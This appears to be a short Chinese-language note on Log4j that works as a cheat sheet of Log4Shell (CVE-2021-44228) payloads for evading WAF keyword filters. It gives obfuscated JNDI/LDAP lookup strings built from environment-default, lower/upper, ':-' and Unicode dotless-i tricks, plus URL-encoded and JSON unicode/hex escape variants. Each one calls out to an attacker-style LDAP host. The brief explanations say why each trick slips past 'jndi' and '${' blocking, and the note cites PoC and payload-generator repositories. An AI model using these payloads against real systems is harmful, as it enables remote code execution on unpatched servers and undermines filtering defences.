up::[[专题 Special Topic]]-[[log4j]]
- # 系统环境变量
	```
	  ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
	```
	- 来自 Apache Log4j 2 文档：${env:ENV_NAME:-default_value}
	- 如果没有 ENV_NAME 系统环境变量，则使用 :- 后面的变量；攻击者可以使用任何名称代替 ENV_NAME，但它必须是不存在的环境变量。
- # Lookup方法：Lower / Upper
	```
	  ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
	  ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
	```
	- Lower Lookup 会将传入的参数转换为小写，嵌套形式如下：
		- ${lower:}
	- Upper Lookup 会将传入的参数转换为大写，嵌套形式如下：
		- ${upper:}
- # "::-" 符号
	```
	  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
	```
	- 同系统环境变量部分。
- # ":-" 符号
	```
	  ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
	```
- # 无效的Unicode字符
	```
	  ${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}
	```
	- 这里的 **ı(\u0131)** 不是 **i(\x69)和I(\x49)**，经过 upper 就会转变成 I，从而绕过了 jndi 关键词的拦截。
- # HTML编码
	```
	  } with %7D
	  { with %7B
	  $ with %24
	```
- # unicode / hex 编码特性
	- 虽然这个范围有点大可能会产生一些误报，但鉴于漏洞的严重性还是有很多人建议拦截 ${ 但这样也未必能够真正的解决，因为漏洞的触发点是在打印日志的时候把可控内容携带进去了。现在随着 JSON 数据格式的流行，很多系统都在使用 JSON 处理参数，JSON 处理库用的最多的就数 Jackson和fastjson。而 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，如：
	```
		  {"key":"\u0024\u007b"}
		  {"key":"\x24\u007b"}
	```
	- 这样就避开了数据包中有 ${ 的条件。
- # 来源
	- https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg
	- https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
	- https://github.com/woodpecker-appstore/log4j-payload-generator
	- https://canarytokens.org/generate